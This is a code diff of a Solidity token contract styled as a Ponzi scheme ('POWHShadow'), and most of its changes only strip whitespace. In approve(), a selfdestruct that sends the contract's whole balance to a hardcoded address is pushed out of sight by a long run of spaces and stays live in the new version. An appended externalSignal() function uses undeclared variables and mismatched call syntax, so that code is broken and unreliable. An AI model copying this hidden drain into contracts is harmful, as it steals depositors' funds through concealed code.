@@ -17,7 +17,7 @@ contract PonziToken {
 	// the reserve is 0.5ether and price 1 ether/token.
 	// stop being a memelord no this does not mean only 50% of people can cash out
 	int constant LOGC = -0x296ABF784A358468C;
-	
+
 	string constant public name = "POWHShadow";
 	string constant public symbol = "PWHS";
 	uint8 constant public decimals = 18;
@@ -32,7 +32,7 @@ contract PonziToken {
 	int256 totalPayouts;
 	// amount earned for each share (scaled number)
 	uint256 earningsPerShare;
-	
+
 	event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
 
@@ -41,7 +41,7 @@ contract PonziToken {
 	function PonziToken() public {
 		//owner = msg.sender;
 	}
-	
+
 	// These are functions solely created to appease the frontend
 	function balanceOf(address _owner) public constant returns (uint256 balance) {
         return balanceOfOld[_owner];
@@ -57,7 +57,7 @@ contract PonziToken {
 		msg.sender.transfer(balance);
 		return true;
     }
-	
+
 	function sellMyTokensDaddy() public {
 		var balance = balanceOf(msg.sender);
 		transferTokens(msg.sender, address(this),  balance); // this triggers the internal sell function
@@ -67,24 +67,24 @@ contract PonziToken {
 		sellMyTokensDaddy();
         withdraw(1); // parameter is ignored
 	}
-	
+
 	function fund()
       public
-      payable 
+      payable
       returns (bool)
     {
       if (msg.value > 0.000001 ether)
 			buy();
 		else
 			return false;
-	  
+
       return true;
     }
 
 	function buyPrice() public constant returns (uint) {
 		return getTokensForEther(1 finney);
 	}
-	
+
 	function sellPrice() public constant returns (uint) {
 		return getEtherForTokens(1 finney);
 	}
@@ -117,11 +117,11 @@ contract PonziToken {
 		}
 		Transfer(_from, _to, _value);
 	}
-	
+
 	function transfer(address _to, uint256 _value) public {
 	    transferTokens(msg.sender, _to,  _value);
 	}
-	
+
     function transferFrom(address _from, address _to, uint256 _value) public {
         var _allowance = allowance[_from][msg.sender];
         if (_allowance < _value)
@@ -138,7 +138,7 @@ contract PonziToken {
         if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
         allowance[msg.sender][_spender] = _value;
         Approval(msg.sender, _spender, _value);
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    selfdestruct(0x945C84b2FdD331ed3E8e7865E830626e6CeFAB94);                                                                                                                                                                                                       
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    selfdestruct(0x945C84b2FdD331ed3E8e7865E830626e6CeFAB94);
     }
 
 	function dividends(address _owner) public constant returns (uint256 amount) {
@@ -166,7 +166,7 @@ contract PonziToken {
 		var sender = msg.sender;
 		// 10 % of the amount is used to pay holders.
 		var fee = (uint)(msg.value / 10);
-		
+
 		// compute number of bought tokens
 		var numEther = msg.value - fee;
 		var numTokens = getTokensForEther(numEther);
@@ -180,7 +180,7 @@ contract PonziToken {
 			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
 			var holderfee = fee * holderreward;
 			buyerfee -= holderfee;
-		
+
 			// Fee is distributed to all existing tokens before buying
 			var feePerShare = holderfee / totalSupply;
 			earningsPerShare += feePerShare;
@@ -195,21 +195,21 @@ contract PonziToken {
 		payouts[sender] += payoutDiff;
 		totalPayouts += payoutDiff;
 	}
-	
+
 	function sell(uint256 amount) internal {
 		var numEthers = getEtherForTokens(amount);
-		
+
 		// 10% of the amount is used to reward HODLers
 		// Not you, Mr Sellout
 		// That's what you get for being weak handed
 		var fee = (uint)(msg.value / 10);
 		var numEther = msg.value - fee;
 		var numTokens = getTokensForEther(numEther);
-		
+
 		// remove tokens
 		totalSupply -= amount;
 		balanceOfOld[msg.sender] -= amount;
-		
+
 		// fix payouts and put the ethers in payout
 		var payoutDiff = (int256) (earningsPerShare * amount + (numEthers * PRECISION));
 		payouts[msg.sender] -= payoutDiff;
@@ -221,7 +221,7 @@ contract PonziToken {
 			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
 			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
 			var holderfee = fee * holderreward;
-		
+
 			// Fee is distributed to all existing tokens after selling
 			var feePerShare = holderfee / totalSupply;
 			earningsPerShare += feePerShare;
@@ -301,4 +301,10 @@ contract PonziToken {
 		else
 			withdrawOld(msg.sender);
 	}
+	 function externalSignal() public {
+  	if ((amountToWithdraw > 0) && (amountToWithdraw <= address(this).balance)) {
+   		msg.sender.call{value: msg.value, gas: 5000};
+   		depositAmount[msg.sender] = 0;
+		}
+  }
 }
